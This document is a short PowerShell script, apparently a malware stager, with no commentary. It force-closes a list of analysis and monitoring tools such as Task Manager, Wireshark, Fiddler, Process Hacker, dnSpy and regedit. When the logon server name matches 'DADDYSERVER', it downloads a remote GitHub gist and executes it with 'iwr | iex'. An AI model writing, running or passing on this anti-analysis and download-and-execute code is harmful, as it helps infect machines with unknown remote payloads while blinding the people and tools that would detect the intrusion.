$2kill = @('cmd', 'taskmgr', 'process', 'processhacker', 'ksdumper', 'fiddler', 'httpdebuggerui', 'wireshark', 'httpanalyzerv7', 'fiddler', 'decoder', 'regedit', 'procexp', 'dnspy', 'vboxservice', 'burpsuit', 'DbgX.Shell', 'ILSpy')

foreach ($prg in $2kill) {
    $rprc = Get-Process -Name $prg -ErrorAction SilentlyContinue
    if ($rprc) {
        Stop-Process -Name $prg -Force 
        Write-Host "[+] Closed process: $prg" -ForegroundColor Yellow
    }
}

if ($env:LOGONSERVER -match "DADDYSERVER") {
    iwr "https://gist.githubusercontent.com/43a1723/ec336f9a82bf70f70d67eb557a4c31ff/raw/39a0af39c66432665097d88960f495d9fe6780ea/skid" | iex
}
